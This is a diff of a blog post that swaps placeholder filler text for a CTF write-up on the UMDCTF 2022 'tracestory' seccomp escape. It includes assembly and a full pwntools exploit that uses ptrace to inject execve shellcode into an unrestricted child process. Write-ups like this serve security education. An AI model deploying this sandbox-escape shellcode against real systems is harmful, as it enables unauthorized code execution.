@@ -7,26 +7,9 @@ author: "skyeto"
 tags: ["ctf"]
 ---
 
-But I must explain to you how all this mistaken idea of denouncing pleasure and praising pain was born and I will give you a complete account of the system, and expound the actual teachings of the great explorer of the truth, the master-builder of human happiness.
+Here's a short writeup on the seccomp jail escape in UMDCTF 2022 (tracestory). 
 
-<aside>
-No one rejects, dislikes, or avoids pleasure itself, because it is pleasure, but because those who do not know how to pursue pleasure rationally encounter consequences that are extremely painful.
-
-Asides don't influence content around them!
-</aside>
-No one rejects, dislikes, or avoids pleasure itself, because it is pleasure, but because those who do not know how to pursue pleasure rationally encounter consequences that are extremely painful. Nor again is there anyone who loves or pursues or desires to obtain pain of itself, because it is pain, but because occasionally circumstances occur in which toil and pain can procure him some great pleasure.
-
-## Another heading
-
-To take a trivial example, which of us ever undertakes laborious physical exercise, except to obtain some advantage from it? But who has any right to find fault with a man who chooses to enjoy a pleasure that has no annoying consequences, or one who avoids a pain that produces no resultant pleasure?
-
-### Perhaps a subheading
-
-But I must explain to you how all this mistaken idea of denouncing pleasure and praising pain was born and I will give you a complete account of the system, and expound the actual teachings of the great explorer of the truth, the master-builder of human happiness. No one rejects, dislikes, or avoids pleasure itself, because it is pleasure, but because those who do not know how to pursue pleasure rationally encounter consequences that are extremely painful.
-
-Alphabets have extraordinarily complex histories. The first recorded proto-alphabet was discovered in the late 1800s at an archeaological digsite outside Cairo.
-
-abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefgh
+I'll skip the reversing part since it was pretty straight forward. The binary forks before setting up seccomp and reading in shellcode from stdin. It allows us to use the following syscalls in our shellcode:
 
 ```bash
 ❯ seccomp-tools dump ./trace_story
@@ -66,18 +49,248 @@ shellcode go here
 
 Most importantly we have very few useful syscalls besides ptrace, we can't even write/read to files! Luckily, ptrace can do quite a few things like pausing execution, reading/writing to memory and so on. 
 
-<aside>
-This is an aside that tells some superfluous info!
-Probably a good idea to not include code elements or other things that take up a lot of space.
-</aside>
-But I must explain to you how all this mistaken idea of denouncing pleasure and praising pain was born and I will give you a complete account of the system, and expound the actual teachings of the great explorer of the truth, the master-builder of human happiness. No one rejects, dislikes, or avoids pleasure itself, because it is pleasure, but because those who do not know how to pursue pleasure rationally encounter consequences that are extremely painful.
+So we need to somehow take control of the forked process and execute some shellcode there without the limitations imposed by seccomp. Thus we have a couple steps to our exploit: 
+1. Take control over the forked process. Also known as attach in ptrace parlance.
+2. Find the instruction pointer.
+3. Write our second stage to its location.
+4. Continue exection.
 
-To take a trivial example, which of us ever undertakes laborious physical exercise, except to obtain some advantage from it? But who has any right to find fault with a man who chooses to enjoy a pleasure that has no annoying consequences, or one who avoids a pain that produces no resultant pleasure?
+The first and second steps are outlined below. They are assembled with pwntools, but that is ommitted in the listing.
 
-1. List
-2. Of 
-3. Things
+```asm
+/* ptrace_attach */
+/* Will pause the execution of the child process and attach ptrace */
+mov rax, 101;
+mov rdi, 16;
+mov rsi, {child}; /* We are given the PID in stdout! */
+mov rdx, 0;
+mov r10, 0;
+syscall;
 
-* List
-* Of
-* Things
+/* getregs syscall(SYS_ptrace, PTRACE_GETREGS, child, 0, rsp+100) */
+/* Writes register values from the child to [r10], this is
+   how we find the instruction pointer                            */
+sub rsp, 512; /* Didn't bother calculating the right size, prolly 120 */
+
+mov rax, 101;
+mov rdi, 12;
+mov rsi, {child};
+mov rdx, 0;
+lea r10, [rsp + 100];
+syscall;
+
+/* set r12 to rip (child rip) */
+mov r12, [rsp + 100 + 128];
+```
+
+Before we write the second stage to the child process we need a second stage. In this case I quickly took it from shell-storm.org.
+
+```asm
+/* nop sled */
+push   0x42
+pop    rax
+inc    ah
+cqo
+push   rdx
+movabs rdi, 0x68732f2f6e69622f
+push   rdi
+push   rsp
+pop    rsi
+mov    r8, rdx
+mov    r10, rdx
+syscall
+/* nop sled */
+```
+
+We also need to use ptrace to write our payload. Annoyingly, it has to be done in chunks of 4 bytes at a time, each written using a syscall.
+
+```python
+write_bytes = ""
+for i in range(0, len(child_shcode), 4):
+	write_bytes += f"""
+	mov rax, 101;
+	mov rdi, 4;
+	mov rsi, {child};
+
+	/* Memory location to write to */
+	mov rdx, [rsp + 100 + 128];
+	add rdx, {i};
+
+	/* Payload bytes */
+	mov r10, {u32(child_shcode[i:i+4].rjust(4,b"0"))};
+	syscall;
+
+	add r12, 4; /* r12 came in handy here */
+	"""
+shellcode_a += asm(write_bytes)
+```
+
+Now that we have written the second stage to the instruction pointer of the second stage all that is left is to restart execution. To avoid killing the child process we leave the parent process in an infinite loop.
+
+```asm
+/* detach ptrace and restart execution */
+mov rax, 101;
+mov rdi, 17;
+mov rsi, {child};
+mov rdx, 0;
+mov r10, 0;
+syscall;
+
+/* yield */
+mov eax, 1
+loop:
+test eax, 1
+jne loop;
+
+/* exit cleanly */
+mov rax, 60;
+mov rdi, 0;
+syscall;
+```
+
+Profit! We have a shell (or can do whatever else we want by modifying the second stage).
+
+
+Below is a full listing of the exploit:
+
+```python
+from pwn import *
+from pwnlib import util
+
+elf = context.binary = ELF("./trace_story")
+context.local(os = 'linux', arch = 'amd64')
+
+#p = process(elf.path)
+p = remote("0.cloud.chals.io", 15148)
+p.recvuntil(b": ")
+child = int(p.recvuntil(b"\n")) # get child pid
+p.recvline()
+
+log.info(f"Child PID: {child}")
+
+# Second stage, spawns shell
+child_shcode = asm("nop; " * 200 + """
+push   0x42
+pop    rax
+inc    ah
+cqo
+push   rdx
+movabs rdi, 0x68732f2f6e69622f
+push   rdi
+push   rsp
+pop    rsi
+mov    r8, rdx
+mov    r10, rdx
+syscall
+nop;
+nop;
+nop;
+nop;
+nop;
+nop;
+nop;
+nop;
+nop;
+nop;
+nop;
+nop;
+nop;
+""")
+
+# rdi rsi rdx r10 r8 r9   res rax
+shellcode_a = asm(f"""
+nop;
+nop;
+nop;
+nop;
+
+/* ptrace_attach */
+mov rax, 101;
+mov rdi, 16;
+mov rsi, {child};
+mov rdx, 0;
+mov r10, 0;
+syscall;
+
+/* getregs syscall(SYS_ptrace, PTRACE_GETREGS, child, 0, rsp+100) */
+sub rsp, 512; /* Cant be bothered calculating the right siz, prolly 120 */
+
+mov rax, 101;
+mov rdi, 12;
+mov rsi, {child};
+mov rdx, 0;
+lea r10, [rsp + 100];
+syscall;
+
+/* set r12 to rip */
+mov r12, [rsp + 100 + 128];
+""")
+
+
+# Generate second stage
+write_bytes = ""
+for i in range(0, len(child_shcode), 4):
+	write_bytes += f"""
+	mov rax, 101;
+	mov rdi, 4;
+	mov rsi, {child};
+
+	mov rdx, [rsp + 100 + 128];
+	add rdx, {i};
+
+	mov r10, {u32(child_shcode[i:i+4].rjust(4,b"0"))};
+	syscall;
+
+	add r12, 4;
+	"""
+shellcode_a += asm(write_bytes)
+
+shellcode_a += asm(f"""
+/* setregs */
+
+mov rax, 0x0;
+mov [rsp + 100 + 80], rax
+mov rax, 0x0;
+mov [rsp + 100 + 96], rax
+
+/* rip */
+mov rax, [rsp + 100 + 128]; 
+add rax, 2;
+mov [rsp + 100 + 128], rax
+
+
+/* syscall(SYS_ptrace, PTRACE_SETREGS, child, 0, rsp+100) */
+mov rax, 101;
+mov rdi, 13;
+mov rsi, {child};
+mov rdx, 0;
+lea r10, [rsp + 100];
+syscall;
+
+/* detach */
+mov rax, 101;
+mov rdi, 17;
+mov rsi, {child};
+mov rdx, 0;
+mov r10, 0;
+syscall;
+
+/* yield */
+mov eax, 1
+loop:
+test eax, 1
+jne loop;
+
+/* exit */
+mov rax, 60;
+mov rdi, 0;
+syscall;
+""")
+
+
+log.info(f"Shellcode siz is {len(shellcode_a)}")
+
+p.sendline(shellcode_a)
+p.interactive()
+```
+
